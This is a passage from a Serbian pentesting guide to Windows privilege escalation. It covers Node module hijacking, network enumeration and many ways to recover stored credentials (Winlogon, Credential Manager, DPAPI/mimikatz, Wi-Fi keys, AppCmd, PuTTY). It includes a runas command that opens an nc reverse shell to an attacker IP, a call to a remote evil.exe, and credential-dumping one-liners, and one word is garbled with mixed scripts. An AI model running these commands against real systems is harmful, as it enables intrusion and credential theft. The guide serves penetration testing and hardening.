- biblioteka treće strane obavije `require("foo")` u `try/catch` i nastavi sa radom ako dođe do greške
- je paket uklonjen iz produkcionih buildova, izostavljen tokom pakovanja ili instalacija nije uspela
- se ranjivi `require()` nalazi duboko u stablu zavisnosti, a ne u glavnom kodu aplikacije

### Pronalaženje ranjivih ciljeva

Koristite **Procmon** da biste potvrdili putanju razrešavanja:<sup>[[23]](#references)</sup>

- Filtrirajte po `Process Name` = izvršna datoteka cilja (`node.exe`, EXE datoteka Electron aplikacije ili wrapper proces)
- Filtrirajte po `Path` `contains` `node_modules`
- Obratite pažnju na `NAME NOT FOUND` i poslednje uspešno otvaranje u okviru `C:\node_modules`

Korisni obrasci za pregled koda u raspakovanim `.asar` datotekama ili izvornom kodu aplikacije:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Identifikujte **naziv paketa koji nedostaje** pomoću Procmon-a ili pregledom izvornog koda.
2. Kreirajte osnovni direktorijum za pretragu ako već ne postoji:

```powershell
mkdir C:\node_modules
```

3. Postavite modul pod tačno očekivanim nazivom:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Pokrenite aplikaciju žrtve. Ako aplikacija pokuša `require("foo")`, a legitimni modul ne postoji, Node može da učita `C:\node_modules\foo.js`.

Stvarni primeri nedostajućih opcionalnih modula koji odgovaraju ovom obrascu uključuju `bluebird` i `utf-8-validate`, ali **tehnika** je ono što se može ponovo koristiti: pronađite bilo koji **nedostajući goli import** koji će privilegovani Windows Node/Electron proces razrešiti.

### Ideje za detekciju i ojačavanje bezbednosti

- Upozorite kada korisnik kreira `C:\node_modules` ili tamo upisuje nove `.js` datoteke/pakete.
- Potražite procese visokog integriteta koji čitaju iz `C:\node_modules\*`.
- U produkciji uključite sve runtime zavisnosti u paket i proverite upotrebu `optionalDependencies`.
- Pregledajte kod trećih strana i potražite obrasce `try { require("...") } catch {}`, koji ne prikazuju greške.
- Onemogućite opcionalne provere ako biblioteka to podržava (na primer, neka `ws` okruženja mogu da izbegnu zastarelu proveru `utf-8-validate` pomoću `WS_NO_UTF_8_VALIDATE=1`).

## Mreža

### Deljeni resursi

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

Proverite da li su drugi poznati računari hardkodirani u hosts fajlu.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Mrežni interfejsi i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otvoreni portovi

Spolja proverite da li su dostupne **usluge koje bi trebalo da budu ograničene**.

```bash
netstat -ano #Opened ports?
```

Za lokalni listener, povežite njegov PID sa vlasnikom procesa, putanjom izvršne datoteke i servisom ili zakazanim zadatkom koji ga pokreće. Servis za daljinsko upravljanje može da omogući pristup kao njegov desktop korisnik samo ako to dozvoljavaju njegova autentifikacija i kontrole komandi. Prilagođena TCP aplikacija koja radi pod nalogom sa višim privilegijama zaseban je cilj za proveru: listener i putanja do binarne datoteke pasivni su tragovi, dok putanja za korupciju memorije koja zahteva autentifikaciju zahteva analizu te konkretne binarne datoteke i ulaza do kog se može doći. Ako izgleda da izloženi port pripada sistemskom procesu, uporedite ga sa [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) pre nego što pripišete port pozadinskom servisu; samo pravilo prosleđivanja ne dokazuje da je odredište dostupno ili ranjivo.

### Tabela rutiranja

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP tabela

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Pravila firewall-a

[**Pogledajte ovu stranicu za komande povezane sa firewall-om**](../basic-cmd-for-pentesters.md#firewall) **(prikaz pravila, kreiranje pravila, isključivanje, isključivanje...)**

Više[ komandi za enumeraciju mreže ovde](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binarna datoteka `bash.exe` takođe se može pronaći u `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ako dobijete root user, možete osluškivati na bilo kom portu (prvi put kada koristite `nc.exe` za osluškivanje na portu, putem GUI-ja će biti zatraženo da li `nc` treba da bude dozvoljen kroz firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Da biste lako pokrenuli bash kao root, možete da probate `--default-user root`

Možete da istražite `WSL` sistem datoteka u fascikli `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Linux `root` u okviru WSL-a sam po sebi ne daje administratorska prava u Windows-u. Ako trenutni Windows identitet može da čita sistem datoteka neke distribucije, pregledajte datoteke sa istorijom shell-a (uključujući `/root/.bash_history`) da biste pronašli komande koje su možda zabeležile akreditive; za eskalaciju je i dalje potreban važeći nalog sa višim privilegijama i dozvoljen način autentifikacije. Raspored fascikli `LocalState\rootfs` važi za starije instalacije WSL-a; WSL 2 obično čuva distribuciju na virtuelnom disku [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), zato najpre utvrdite konkretnu distribuciju i putanju za skladištenje. Izbegavajte ispisivanje sadržaja istorije tokom automatizovanog enumerisanja.

## Windows akreditivi

### Winlogon akreditivi

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Tretirajte `DefaultUserName` i `DefaultDomainName` kao kontekst naloga, a ne kao akreditive. Neprazna vrednost `DefaultPassword` ili `AltDefaultPassword` predstavlja nalaz plaintext vrednosti u registru. Ako je `AutoAdminLogon=1`, ali plaintext lozinka nije čitljiva, to je samo nagoveštaj: [Sysinternals Autologon može da skladišti lozinku kao LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), a uobičajena čitanja registra ne utvrđuju da li taj secret postoji ili može da se preuzme. Pregledajte prava pristupa i stvarnu konfiguraciju prijavljivanja pre nego što prijavite izlaganje akreditiva.

### Menadžer akreditiva / Windows vault

Sa [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault čuva korisničke akreditive za servere, veb-sajtove i druge programe koje **Windows** može da koristi za **automatsko prijavljivanje korisnika**. Na prvi pogled, može se učiniti da korisnici mogu da čuvaju akreditive za sajtove kao što su Facebook, Twitter ili Gmail i da se pregledači automatski prijavljuju, ali to ne funkcioniše tako.

Windows Vault čuva akreditive pomoću kojih Windows može automatski da prijavljuje korisnike, što znači da svaka **Windows aplikacija kojoj su potrebni akredიტиви za pristup resursu** (serveru ili veb-sajtu) **može da koristi ovaj Credential Manager** i Windows Vault i da upotrebi dostavljene akreditive umesto da korisnici svaki put unose korisničko ime i lozinku.

Ako aplikacije ne komuniciraju sa Credential Manager-om, mislim da ne mogu da koriste akreditive za dati resurs. Dakle, ako vaša aplikacija želi da koristi vault, trebalo bi nekako da **komunicira sa menadžerom akreditiva i zatraži akreditive za taj resurs** iz podrazumevanog skladišta vault-a.

Koristite `cmdkey` da biste izlistali sačuvane akreditive na mašini.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Zatim možete koristiti `runas` sa opcijom `/savecred` kako biste koristili sačuvane akreditive. Sledeći primer poziva udaljenu binarnu datoteku preko SMB deljenja.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Korišćenje `runas` sa datim skupom akreditiva.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Imajte na umu da se to može uraditi pomoću mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ili modula [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Savremene Windows UWP aplikacije, Microsoft Edge i savremeni sistemski servisi čuvaju tokene za autentifikaciju i lozinke u plaintextu unutar Universal Windows Platform (UWP) `PasswordVault` skladišta (dostupnog i kao `Web Credentials` u `vaultcmd`). Ovo skladište je izolovano po sesijama i može se dešifrovati nativno, bez administratorskih prava ili prava `SeDebugPrivilege`.

Pokrenite ovu PowerShell komandu u aktivnoj korisničkoj sesiji da biste odmah izlistali i dešifrovali sva sačuvana korisnička imena i lozinke u plaintextu:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** pruža način za simetrično šifrovanje podataka i pretežno se koristi u operativnom sistemu Windows za simetrično šifrovanje asimetričnih privatnih ključeva. Ovo šifrovanje koristi korisničku ili sistemsku tajnu kako bi značajno doprinelo entropiji.

**DPAPI omogućava šifrovanje ključeva pomoću simetričnog ključa izvedenog iz korisničkih tajni za prijavljivanje**. U slučajevima sistemskog šifrovanja koristi tajne za autentifikaciju domena sistema.

Šifrovani korisnički RSA ključevi, zaštićeni pomoću DPAPI-ja, čuvaju se u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde `{SID}` označava korisnički [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **DPAPI ključ, koji se nalazi uz glavni ključ koji štiti korisnikove privatne ključeve u istoj datoteci**, obično se sastoji od 64 bajta nasumičnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, pa se njegov sadržaj ne može prikazati pomoću komande `dir` u CMD-u, ali može pomoću PowerShell-a.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Možete koristiti **mimikatz modul** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) da biste ga dešifrovali.

**Fajlovi sa akreditivima zaštićeni glavnom lozinkom** obično se nalaze u:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Možete koristiti **mimikatz module** `dpapi::cred` sa odgovarajućim `/masterkey` da biste dešifrovali.\
Možete **izvući mnogo DPAPI** **masterkeys** iz **memorije** pomoću modula `sekurlsa::dpapi` (ako imate root pristup).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell akreditivi

**PowerShell akreditivi** se često koriste za **skriptovanje** i zadatke automatizacije, kao praktičan način za čuvanje šifrovanih akreditiva. Akreditivi su zaštićeni pomoću **DPAPI**, što obično znači da ih može dešifrovati samo isti korisnik na istom računaru na kojem su kreirani.

Izvezeni akreditiv može imati proizvoljan naziv datoteke ili putanju `.xml`. Kada skripta ili popis datoteka ukazuje na njega, utvrdite stvarnu putanju profila naloga, umesto da pretpostavite da se nalazi u `C:\Users`: [Windows može da smesti profile na drugo mesto](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Čitljiva datoteka je samo trag; [`Export-Clixml` u Windows-u vezuje šifrovani akreditiv za korisnika i računar koji su ga izvezli](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a svaki oporavljeni nalog mora zasebno da ima važeća prava na predviđenom servisu. Najpre pregledajte putanje i ACL-ove, bez ispisivanja šifrovanih ili otvorenih vrednosti tokom rutinskog popisivanja.

Da biste **dešifrovali** PS akreditive iz datoteke koja ih sadrži, možete da uradite sledeće:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Sačuvane RDP veze

Možete ih pronaći u `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
i u `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Nedavno pokrenute komande

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Menadžer akreditiva za udaljenu radnu površinu**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Koristite modul `dpapi::rdg` iz alata **Mimikatz** sa odgovarajućim `/masterkey` da biste **dešifrovali sve .rdg datoteke**\
Možete **izvući mnogo DPAPI masterkey ključeva** iz memorije pomoću modula `sekurlsa::dpapi` iz alata Mimikatz

**mRemoteNG koristi drugačije skladište veza.** Pregledajte čitljive XML datoteke u `%APPDATA%\mRemoteNG` i korisničkim fasciklama Documents, uključujući datoteke sa uobičajenim imenima kao što je `config.xml`. Identifikujte šemu veza i šifrovane atribute `Password` pre nego što XML datoteku uzmete u obzir kao mogući izvor akreditiva. Sačuvana vrednost nije DPAPI/RDCMan lozinka; oporavak zavisi od postavki šifrovanja datoteke i od toga da li je korišćena prilagođena glavna lozinka. Izbegavajte ispisivanje šifrovanih vrednosti tokom široke enumeracije.

**Izvezeni Remote Desktop Plus profili** mogu biti čitljivi i u korisničkim fasciklama ili deljenoj administrativnoj fascikli. Izvezena zastarela datoteka `profiles.xml` sadrži stavke `Data/Profile` sa elementima `ProfileName`, `Password` i `Secure`. Neprazan element lozinke smatrajte mogućim izvorom akreditiva, ali ga nemojte ispisivati niti pretpostavljati da sadrži običan tekst: [dobavljač navodi](https://www.donkz.nl/) da zaštita profila može biti vezana za nalog i računar na kojima je profil kreiran ili konfigurisana sa blažim postavkama. Pre nego što se oslonite na te podatke, potvrdite poreklo datoteke i uslove oporavka.

### Sticky Notes

Ljudi često koriste aplikaciju Sticky Notes na Windows radnim stanicama da bi **sačuvali lozinke** i druge informacije, ne shvatajući da je u pitanju datoteka baze podataka. Ta datoteka se nalazi na putanji `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i uvek je vredi potražiti i pregledati.

Ljudi ponekad čuvaju lozinke i druge informacije u aplikacijama za lepljive beleške. Microsoftova upakovana aplikacija Sticky Notes obično čuva beleške na putanji `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starije ili drugačije aplikacije mogu koristiti druga skladišta u korisničkom profilu, uključujući LevelDB. Pre nego što zaključite da nema beležaka zato što SQLite datoteka nedostaje, utvrdite koja je aplikacija instalirana i koji format skladišta koristi.

Ako Sticky Notes koristi SQLite zapisivanje unapred (WAL), kopija datoteke `plum.sqlite` sama po sebi može izostaviti nedavno potvrđene beleške. Sačuvajte odgovarajuću datoteku `plum.sqlite-wal` uz doslednu kopiju baze podataka, a uključite i `plum.sqlite-shm` ako je dostupna; indeks deljene memorije može ponovo da se izgradi, ali WAL je deo trajnog stanja baze podataka. Pogledajte [SQLite WAL dokumentaciju](https://www.sqlite.org/wal.html). Beleška koja sadrži ime naloga ili lozinku samo je mogući izvor akreditiva: zasebno proverite nalog, dozvoljeni pristup i ponovnu upotrebu lozinke. Za šifrovani zapis iz menadžera lozinki potrebni su i stvarni ključ za dešifrovanje i tumačenje specifično za aplikaciju da bi se na osnovu njega mogao potvrditi prijavljeni nalog sa višim privilegijama.

### AppCmd.exe

**Imajte u vidu da za oporavak lozinki iz AppCmd.exe morate biti Administrator i pokrenuti ga na nivou visokog integriteta.**\
**AppCmd.exe** se nalazi u direktorijumu `%systemroot%\system32\inetsrv\`.\
Ako ova datoteka postoji, moguće je da su konfigurisani neki **akreditivi** koji se mogu **oporaviti**.

Ovaj kod je preuzet iz projekta [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Proverite da li postoji `C:\Windows\CCM\SCClient.exe` .\
Instalacioni programi se **pokreću sa SYSTEM privilegijama**, mnogi su ranjivi na **DLL Sideloading (informacije sa** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Datoteke i registar (akreditivi)

### Artefakti akreditiva u registru alata za podršku

Neke starije instalacije za udaljenu podršku zadržavaju nazive vrednosti povezane sa lozinkama pod fiksnim ključevima registra aplikacije. Na primer, `SecurityPasswordAES` u TeamViewer-u označavao je konfigurisanu statičku lozinku sesije u verzijama pre 9, prema [objašnjenju proizvođača o ključu registra](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Oznaka u nazivu vrednosti samo je povod za proveru: pre procene tog akreditiva proverite instaliranu verziju, čitljivost podataka vrednosti, format i trenutno ponašanje pri autentifikaciji. Prelazak sa lozinke za udaljenu podršku na privilegovaniji Windows nalog dodatno zahteva stvarnu ponovnu upotrebu lozinke i ovlašćenje za taj nalog. Izbegavajte da šifrat i oporavljene lozinke budu deo rutinskog izlaza enumeracije.

### Deljene proračunske tabele sa zaštićenim listovima

Ako se sumnja da čitljiva deljena radna sveska sadrži podatke o nalozima, razlikujte **šifrovanje datoteke** od zaštite radnog lista ili skrivenih kolona. [Microsoft navodi](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) da zaštita radnog lista ograničava uređivanje i nije bezbednosna funkcija; sama po sebi ne potvrđuje da je sadržaj radne sveske šifrovan. Pregledajte samo ovlašćene i relevantne datoteke i izbegavajte ispisivanje mogućih tajni tokom opšte enumeracije. Čitljiva putanja do `.xlsx` datoteke, zaštićeni list ili skrivena kolona sami po sebi ne dokazuju da akreditivi postoje niti da neki nalog ima veće privilegije; zasebno proverite stvarne podatke i trenutna prava naloga.

### Sačuvane zakrpe izmena na CI serveru

CI server može da zadrži poslate izmene izvornog koda u svom direktorijumu sa podacima i nakon završetka izgradnje. [TeamCity dokumentuje](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` kao lokaciju za izmene iz udaljenih izvršavanja; direktorijum sa podacima može biti prilagođen i ne mora se nalaziti pod `ProgramData`. Čitljiva zakrpa može da sačuva uklonjene ili dodate reference na datoteku sa akreditivima, ključ za šifrovanje ili skriptu koja koristi oboje. Na primer, PowerShell postupak `ConvertTo-SecureString -Key` zahteva i AES ključ i šifrovani niz; [Microsoft dokumentuje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) da se ključ prosleđuje zasebno. Najpre pregledajte samo dostupne nazive zakrpa, a zatim uz ovlašćenje proverite relevantan sadržaj, bez ispisivanja tajni tokom rutinske enumeracije. Putanja do zakrpe, šifrovana vrednost ili referenca na ključ same po sebi ne dokazuju postojanje važećeg akreditiva niti pristup sa većim privilegijama. Ograničite ACL-ove direktorijuma sa podacima i izbegavajte unošenje tajni u izmene izgradnje.

### Prilagođena rotacija lozinke lokalnog administratora

Kućno izrađen rotator lozinki može da čuva šifrovanu lozinku lokalnog administratora u lokalnoj usluzi, a akreditive za skladište podataka u čitljivoj datoteci `.env` ili pored izvršne datoteke programa za ažuriranje. Zajedno proverite zakazani zadatak programa za ažuriranje, nalog, ACL-ove konfiguracije, listener i dozvole za skladište podataka. Skladište podataka dostupno samo preko loopback adrese i dalje je dostupno lokalnom korisniku koji ima važeće akreditive, ali sama autentifikacija ne dokazuje da korisnik ima dozvolu za čitanje relevantnih zapisa. Ako su seed za šifrovanje ili ključni materijal dostupni pored šifrata, pre nego što se pouzdate u šifrovanje proverite tačan postupak izvođenja ključa. Šema koja deterministički izvodi AES ključ iz izloženog seed-a pomoću Go paketa [`math/rand`](https://pkg.go.dev/math/rand) nije prikladna za zaštitu te lozinke; Go navodi da taj paket nije namenjen slučajnosti osetljivoj na bezbednost. Pre nego što oporavljenu lozinku smatrate putem za eskalaciju, potvrdite da je važeća i da pripada nalogu iz lokalne grupe Administrators. Zakazani zadatak, putanja do `.env` datoteke ili šifrovani blob sami po sebi ništa od toga ne dokazuju. Izbegavajte da lozinke i ključni materijal budu deo rutinskog izlaza enumeracije.

Za upravljanje lozinkama lokalnih administratora koristite [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Njegovo skladištenje u direktorijumu ili Entra sistemu i kontrole pristupa razlikuju se od prilagođenog lokalnog skladišta podataka; [uloge Elasticsearch-a](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) takođe određuju da li autentifikovani korisnik skladišta podataka može da čita određeni indeks.

### Arhive dodataka Java servera i ponovna upotreba akreditiva

Neki dodaci Java servera distribuiraju se kao JAR arhive u direktorijumu `plugins` servera. Čitljiv prilagođeni dodatak može da sadrži konfiguraciju ili bajtkod sa ugrađenim akreditivom usluge. Pregledajte arhivu samo uz ovlašćenje i izbegavajte da oporavljene tajne budu deo rutinskog izlaza enumeracije. Sama putanja do dodatka ne dokazuje da tajna postoji, a oporavljena lozinka usluge vodi do većih privilegija samo ako važi i za privilegovaniji nalog. Proverite relevantne ACL-ove datoteka i zamenite ponovo korišćene akreditive zasebnim tajnama. Pogledajte [uputstvo za instalaciju dodataka PaperMC-a](https://docs.papermc.io/paper/adding-plugins/) za raspored direktorijuma i [dokumentaciju JAR arhiva kompanije Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) za sadržaj arhiva.

### Akreditivi ugrađene baze podataka Openfire-a

Openfire instalacija koja koristi ugrađenu bazu podataka može da čuva `openfire.script` u direktorijumu `Openfire\embedded-db`. Ako trenutni nalog može da ga čita, zajedno pregledajte zapise `OFUSER` i svojstvo `passwordKey`. Openfire-ova [dokumentacija o pružaocu korisnika](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) navodi da lozinke mogu da se čuvaju u otvorenom tekstu ili šifrovane ključem koji se nalazi u tom svojstvu. Oporavljena lozinka važna je za eskalaciju samo ako i dalje važi za privilegovaniji identitet; samo ime datoteke ne dokazuje ni pristup za čitanje ni ponovnu upotrebu akreditiva. Putanja služi kao smernica za inventarizaciju, pa izbegavajte da sadržaj baze podataka i akreditivi budu deo rutinskog izlaza enumeracije.

Zasebna datoteka `Openfire\conf\openfire.xml` može da otkrije konfigurisane portove i adresu vezivanja administratorske konzole čak i kada se koristi spoljna baza podataka. Openfire obično vezuje administratorsku konzolu za loopback adresu; lokalni nalog i dalje može da pristupi toj adresi ako listener radi. Zajedno proverite stvarni listener, ovlašćenu administratorsku ulogu, pravila za otpremanje dodataka i identitet Openfire usluge. Administrator koji može da instalira dodatak može da izazove izvršavanje koda dodatka u kontekstu usluge, što može imati visoke privilegije kada se usluga pokreće kao LocalSystem. Podudaranje lozinke naloga ili čitljiva putanja do konfiguracije sami po sebi ne dokazuju pristup administratorskoj konzoli niti izvršavanje koda. Pogledajte proizvođačevo [uputstvo za instalaciju i upravljanje dodacima](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) i [svojstvo API-ja za otpremanje dodataka](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguracija forenzičkog servera za upravljanje

Konfiguracije servera Velociraptor, koje se obično zovu `server.config.yaml`, mogu da sadrže `CA.private_key` internog CA-a. Ako korisnik sa nižim privilegijama može da čita taj ključ, možda može da izda klijentski sertifikat za API. Da li to vodi do većih privilegija zavisi od korisničkih uloga na serveru, dostupnosti API-ja i identiteta pod kojim se izvršava server ili ciljni agent. Klijentska konfiguracija sadrži drugačiji materijal; njen pronalazak ne potvrđuje pristup CA-u servera. U nekim instalacijama privatni ključ CA-a čuva se van mreže, pa čitljiva konfiguracija servera možda ne sadrži ključ za potpisivanje.

Na Windows serveru proverite ACL konfiguracije **servera** u instalacionom direktorijumu i svih zaštićenih rezervnih kopija. Jedna moguća lokacija je `%ProgramFiles%\VelociraptorServer\server.config.yaml`; ako je drugačije, koristite putanju konfigurisanu za uslugu. Potvrdite da trenutni identitet može da čita datoteku i da je `CA.private_key` zaista prisutan. Izbegavajte ispisivanje privatnog ključa u dnevnike ili izlaz enumeracije. Proizvođačev postupak `config api_client` koristi ključ CA-a za izdavanje klijentskog sertifikata, ali potrebna je i efektivna uloga na strani servera; njeno kreiranje ili menjanje može zahtevati pristup za upis u skladište podataka ili ponovno pokretanje. Postojeći privilegovani identitet servera može da pruži put čak i kada ti upisi nisu mogući. API upiti sa pravima za izvršavanje pokreću se u relevantnom kontekstu servera ili agenta, koji može imati visoke privilegije.

Zaštitite konfiguraciju servera i rezervne kopije restriktivnim ACL-ovima, držite ključ za potpisivanje CA-a van mreže kad god je moguće i ograničite API uloge i pristup listeneru. Pogledajte [dokumentaciju Velociraptor API-ja](https://docs.velociraptor.app/docs/server_automation/server_api/) i [smernice za bezbednosnu konfiguraciju](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

